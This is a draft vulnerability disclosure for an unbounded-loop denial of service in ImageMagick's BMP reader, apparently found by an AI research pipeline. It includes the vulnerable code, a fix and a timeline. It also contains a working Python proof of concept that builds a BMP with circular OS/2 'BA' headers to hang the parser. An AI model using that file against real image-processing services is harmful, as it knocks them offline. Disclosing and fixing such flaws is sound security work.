# Vulnerability Disclosure Draft — ImageMagick BMP OS/2 BA Header Unbounded Loop

**Internal ID**: CAND-010  
**Target**: ImageMagick 7.1.1-44  
**File**: `coders/bmp.c`  
**Status**: Draft — Pending Internal Review  
**Discovered**: 2026-04 via CyberAI Pipeline A (GLM-5.1)  
**CVSS v3.1 (estimated)**: 5.5 (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)  
**CWE**: CWE-835 / CWE-400 (Unbounded Resource Consumption)

---

## Summary

The BMP OS/2 Bitmap Array header parser in `coders/bmp.c` iterates
through chained `BA` headers with no iteration limit, allowing a crafted
BMP file containing a circular `BA` chain to trigger an infinite loop
and CPU denial-of-service. No memory corruption occurs.

---

## Affected Versions

- **Confirmed**: ImageMagick 7.1.1-44
- **Likely affected**: All 7.x and 6.x versions with OS/2 BMP support

---

## Vulnerability Details

### Location

```
File:  coders/bmp.c
Lines: ~672–690 (version 7.1.1-44)
Function: ReadBMPImage()
```

### Vulnerable Code

```c
while (LocaleNCompare((char *) magick, "BA", 2) == 0)
{
    /* Read 14-byte OS/2 Bitmap Array header */
    bmp_info.ba_offset = ReadBlobLSBLong(image);
    /* ... skip to next header ... */
    offset = SeekBlob(image, (MagickOffsetType) bmp_info.ba_offset,
                      SEEK_SET);
    count = ReadBlob(image, 2, magick);
    /* loop condition re-evaluated — no iteration counter */
}
```

### Root Cause

The OS/2 Bitmap Array format allows multiple BMP images to be chained
via `ba_offset` pointers. ImageMagick follows these pointers in an
unbounded `while` loop with no:

- Maximum iteration count
- Cycle detection (visited-offset set)
- Total-bytes-consumed budget

A circular chain (`A.ba_offset → B`, `B.ba_offset → A`) causes the
loop to follow offsets indefinitely, consuming 100% CPU. Depending on
file structure, it may also re-read the same 14-byte blocks from a
seek-friendly blob.

### Impact

CPU exhaustion DoS. Any process passing attacker-controlled BMP data
to `ReadBMPImage()` is affected. Widely exploitable via server-side
image pipelines.

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Craft a BMP with a circular OS/2 BA chain → infinite loop DoS.
Usage: python3 poc_bmp_ba.py > poc.bmp
       convert poc.bmp /tmp/out.png   # hangs
"""
import struct, sys

def u32le(n): return struct.pack("<I", n)
def u16le(n): return struct.pack("<H", n)

# Two BA headers pointing to each other:
# Header A at offset 0, ba_offset → 14 (header B)
# Header B at offset 14, ba_offset → 0 (header A)

header_a = (
    b"BA"           # magic
    + u32le(14)     # ba_offset → jump to header B
    + u16le(0)      # ba_screen_width (ignored)
    + u16le(0)      # ba_screen_height
    + u32le(0)      # next_array_entry (not used in loop check)
    + u16le(0)      # reserved
)  # 14 bytes total

header_b = (
    b"BA"           # magic
    + u32le(0)      # ba_offset → jump back to header A
    + u16le(0)
    + u16le(0)
    + u32le(0)
    + u16le(0)
)  # 14 bytes total

sys.stdout.buffer.write(header_a + header_b)
```

---

## Proposed Fix

Add an iteration counter and/or a visited-offset set:

```c
/* bmp.c — ReadBMPImage() */
size_t ba_depth = 0;
const size_t MaxBitmapArrayDepth = 256;

while (LocaleNCompare((char *) magick, "BA", 2) == 0)
{
    if (++ba_depth > MaxBitmapArrayDepth)
        ThrowReaderException(CorruptImageError,
                             "TooManyBitmapArrayHeaders");
    /* ... existing body ... */
}
```

Optionally, maintain a `LinkedListInfo` of visited offsets to detect
cycles and provide a clearer error.

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-04-23 | Confirmed via manual source analysis |
| 2026-04-25 | Coordinate with CAND-009 (GIF LZW) — send combined report |
| 2026-07-23 | 90-day deadline |

*Recommend coordinating CAND-009 + CAND-010 into a single email to
reduce noise for the maintainers.*

---

## Contact

Same as CAND-009: security@imagemagick.org
